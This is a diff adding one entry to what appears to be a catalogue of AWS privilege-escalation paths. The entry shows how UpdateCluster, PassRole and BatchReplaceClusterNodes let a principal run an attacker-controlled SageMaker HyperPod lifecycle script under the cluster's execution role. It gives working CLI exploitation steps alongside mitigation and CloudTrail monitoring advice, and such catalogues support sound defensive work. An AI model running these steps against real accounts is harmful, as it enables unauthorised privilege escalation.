@@ -1,0 +1,111 @@
+id: sagemaker-008
+name: iam:PassRole + sagemaker:UpdateCluster + sagemaker:BatchReplaceClusterNodes
+category: existing-passrole
+services:
+  - iam
+  - sagemaker
+permissions:
+  required:
+    - permission: sagemaker:UpdateCluster
+      resourceConstraints: Must cover an existing HyperPod cluster whose instance group lifecycle configuration can be changed
+    - permission: iam:PassRole
+      resourceConstraints: Must cover the instance group's execution role, even when the update keeps the same role
+    - permission: sagemaker:BatchReplaceClusterNodes
+      resourceConstraints: Must cover a replaceable node in the target cluster so the changed OnCreate script executes
+  additional:
+    - permission: sagemaker:DescribeCluster
+      resourceConstraints: Helpful for obtaining the existing instance group configuration to retain in the update request
+description: A principal with `sagemaker:UpdateCluster`, `iam:PassRole`, and `sagemaker:BatchReplaceClusterNodes` can change an existing SageMaker HyperPod instance group's OnCreate lifecycle script to an attacker-controlled script in S3, then replace a node to execute it with the cluster execution role's credentials. The update does not run the script on current nodes. SageMaker checks `iam:PassRole` even when the update reuses the existing execution role.
+prerequisites:
+  admin:
+    - An existing HyperPod cluster has an execution role with administrative permissions, such as AdministratorAccess or an equivalent custom policy.
+    - The attacker controls a lifecycle script at an S3 location readable by the execution role, and the cluster has a replaceable node.
+  lateral:
+    - An existing HyperPod cluster has an execution role with permissions beyond those of the attacker.
+    - The attacker controls a lifecycle script at an S3 location readable by the execution role, and the cluster has a replaceable node.
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        cat > update.json <<'JSON'
+        {
+          "ClusterName": "TARGET_CLUSTER",
+          "InstanceGroups": [{
+            "InstanceGroupName": "TARGET_GROUP",
+            "InstanceType": "EXISTING_INSTANCE_TYPE",
+            "InstanceCount": 1,
+            "SlurmConfig": {"NodeType": "EXISTING_NODE_TYPE"},
+            "LifeCycleConfig": {
+              "SourceS3Uri": "s3://CONTROLLED_BUCKET/scripts/",
+              "OnCreate": "on_create.sh"
+            },
+            "ExecutionRole": "arn:aws:iam::ACCOUNT_ID:role/EXISTING_ROLE",
+            "ThreadsPerCore": 1
+          }]
+        }
+        JSON
+        aws sagemaker update-cluster --cli-input-json file://update.json
+      description: Preserve the target group's actual configuration while changing its lifecycle script. The request must include its existing execution role, which SageMaker checks against `iam:PassRole`.
+    - step: 2
+      command: |
+        aws sagemaker batch-replace-cluster-nodes \
+          --cluster-name TARGET_CLUSTER \
+          --node-ids i-0123456789abcdef0
+      description: Replace a node to trigger the changed OnCreate script. Replacement deletes data on the selected node; the example node ID must be replaced with a real, replaceable node ID.
+recommendation: |
+  Restrict `sagemaker:UpdateCluster` on production HyperPod clusters and scope `iam:PassRole` to approved roles with the `iam:PassedToService` condition set to `sagemaker.amazonaws.com`. Give cluster execution roles only the permissions their workloads need. Control who can modify lifecycle script objects in S3 and which script locations are approved. Monitor CloudTrail `UpdateCluster` events for changes to `InstanceGroups[].LifeCycleConfig` or `InstanceGroups[].ExecutionRole`, then correlate with node provisioning or `BatchReplaceClusterNodes`. Review lifecycle changes before reprovisioning nodes.
+limitations: |
+  `sagemaker:UpdateCluster` alone was denied in a sandbox test: `iam:PassRole` was required even when retaining the existing execution role. The update changed stored configuration but did not rerun OnCreate on an InService node. This self-triggered chain requires a replaceable node and `sagemaker:BatchReplaceClusterNodes`; an unrelated future node provision can also trigger the script. Replacing nodes can destroy local data and may require cluster platform prerequisites. The resulting access is bounded by the execution role.
+discoveryAttribution:
+  firstDocumented:
+    author: Daniel Grzelak
+    organization: Plerion
+    date: 2026
+references:
+  - title: AWS UpdateCluster API
+    url: https://docs.aws.amazon.com/sagemaker/latest/APIReference/API_UpdateCluster.html
+  - title: AWS BatchReplaceClusterNodes API
+    url: https://docs.aws.amazon.com/sagemaker/latest/APIReference/API_BatchReplaceClusterNodes.html
+  - title: AWS SageMaker service authorization reference
+    url: https://docs.aws.amazon.com/service-authorization/latest/reference/list_sagemaker.html
+relatedPaths:
+  - sagemaker-005
+attackVisualization:
+  nodes:
+    - id: attacker
+      label: Starting principal
+      type: principal
+      description: Can update the cluster, pass its execution role, and replace a node.
+    - id: cluster
+      label: Existing HyperPod cluster
+      type: resource
+      description: Its instance group is changed to use an attacker-controlled OnCreate script.
+    - id: script
+      label: OnCreate lifecycle script
+      type: payload
+      description: Runs when a node is later provisioned or replaced.
+    - id: role
+      label: Cluster execution role
+      type: principal
+      description: Supplies AWS privileges to the node and its lifecycle script.
+    - id: outcome
+      label: Execution role access
+      type: outcome
+      description: The script can take actions allowed by the cluster execution role.
+  edges:
+    - from: attacker
+      to: cluster
+      label: iam:PassRole + sagemaker:UpdateCluster
+      description: Change the lifecycle script while retaining a passable execution role.
+    - from: cluster
+      to: script
+      label: sagemaker:BatchReplaceClusterNodes
+      description: The update itself does not run the script; the attacker replaces a node to execute OnCreate.
+    - from: script
+      to: role
+      label: Execution role credentials
+      description: The script can use the execution role assigned to the instance group.
+    - from: role
+      to: outcome
+      label: Role permissions
+      description: Access is limited to permissions granted to the execution role.
